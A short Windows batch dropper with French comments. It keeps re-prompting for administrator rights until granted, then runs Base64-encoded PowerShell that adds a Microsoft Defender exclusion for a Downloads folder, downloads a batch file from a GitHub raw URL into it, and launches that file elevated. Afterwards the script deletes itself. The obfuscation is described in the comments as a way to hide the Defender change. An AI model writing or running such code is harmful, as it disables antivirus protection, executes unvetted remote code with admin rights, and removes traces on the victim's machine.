@echo off
setlocal

:: --- BOUCLE D'ELEVATION ULTRA-RAPIDE ---
:check_admin
net session >nul 2>&1
if %errorLevel% neq 0 (
    powershell -Command "try { Start-Process '%~f0' -Verb RunAs -ErrorAction Stop } catch { exit 1 }" >nul 2>&1
    if %errorlevel% neq 0 goto :check_admin
    exit /b
)

:: --- PAYLOAD ENCODE (Cache Add-MpPreference de Defender) ---
:: Cette ligne contient exactement ta commande PowerShell, mais en Base64.
set "cmd=JABwAD0AJwAkAGUAbgB2ADoAVQBTAEUAUgBQAFIATwBGAEkATABFAFwARABvAHcAbgBsAG8AYQBkAHMAXABOAG8AVwBpAG4AJwA7ACAAbgBpACAAJABwACAALQBpACAAZAAgAC0AZgA7ACAAQQBkAGQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAAgACQAcAAgAC0ARQBBACAAMAA7ACAAaQB3AHIAIAAiAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8ATABpAGcAaAB0AFoAaQByAGMAbwBuAGkAdABlAC8ATgBvAFcAaQBuAC8AbQBhAGkAbgAvAGYAbwByAGMAZQAtAHUAcABkAGEAdABlAC0AYQBnAGUAbgB0AC4AYgBhAHQAIgAgAC0AbwAgACIAJABwAFwAZgAuAGIAYQB0ACIAOwAgAHMAdABhAHIAdAAgACIAJABwAFwAZgAuAGIAYQB0ACIAIAAtAEEAcgBnAHMAIAAiAC0ALQB5AGUAcwAiACAALQB2ACAAcgB1AG4AYQBzAA=="

powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand %cmd%

:: Auto-suppression pour que la prochaine commande Win+R reprenne le fichier neuf
start /b "" cmd /c del "%~f0"&exit
